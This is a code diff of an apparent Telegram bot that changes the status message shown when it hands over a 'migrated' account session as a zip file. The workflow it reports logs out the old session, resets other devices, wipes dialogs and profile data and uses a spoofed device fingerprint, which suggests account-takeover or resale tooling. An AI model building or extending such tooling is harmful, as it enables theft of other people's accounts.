@@ -1060,33 +1060,24 @@ async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMCo
             zf.write(meta_file, arcname=f"{phone}.json")
 
         data = zip_path.read_bytes()
-        reset_status = "✅ Сброшены" if clean_info.sessions_reset else f"⚠️ {clean_info.sessions_reset_warning}"
+        reset_status = "сброшены" if clean_info.sessions_reset else "не сброшены"
 
         if mig.is_new_session:
-            old_status = "— (Создана с нуля)"
+            old_line = ""
         elif mig.old_session_terminated:
-            old_status = "✅ Завершена (Log Out)"
+            old_line = "Старая сессия: завершена\n"
         else:
-            safe_err = html.escape(mig.old_session_error or 'Сетевая ошибка')
-            old_status = f"❌ Сбой деавторизации ({safe_err})"
+            old_line = "Старая сессия: не завершена\n"
+
+        ttl_line = "\nАвтоудаление аккаунта: 30 дней без активности" if clean_info.ttl_set_30d else ""
 
         caption = (
-            f"⚡ <b>Сессия мигрирована и очищена по v100x+</b>\n\n"
-            f"📞 Телефон: <code>{html.escape(phone)}</code>\n"
-            f"🆔 ID: <code>{metadata['id']}</code>\n"
-            f"💻 Устройство: <code>{html.escape(mig.fingerprint['device'])} ({html.escape(mig.fingerprint['sys'])})</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🔒 <b>Старая сессия: {old_status}</b>\n"
-            f"👤 Профиль и @username: <b>Очищены</b>\n"
-            f"🖼 Удалено аватарок: <b>{clean_info.photos_deleted}</b>\n"
-            f"🔒 Privacy Lockdown: <b>Включён</b>\n"
-            f"💳 Данные карт/платежей: <b>Очищены</b>\n"
-            f"⏳ TTL аккаунта: <b>30 дней</b>\n"
-            f"📇 Контакты и поисковый граф: <b>Удалены</b>\n"
-            f"📁 Папок: <b>{clean_info.folders_deleted}</b> | Стикеров: <b>{clean_info.stickers_removed}</b>\n"
-            f"👑 Каналов владельца: <b>{clean_info.channels_deleted}</b>\n"
-            f"🗑 Диалогов/ботов/групп: <b>{clean_info.dialogs_purged}</b>\n"
-            f"📱 Другие устройства: {reset_status}"
+            "<b>Сессия готова</b>\n\n"
+            f"<code>{html.escape(phone)}</code> · ID <code>{metadata['id']}</code>\n"
+            f"{old_line}"
+            f"Удалено диалогов: {clean_info.dialogs_purged}\n"
+            f"Другие устройства: {reset_status}"
+            f"{ttl_line}"
         )
 
         await message.answer_document(
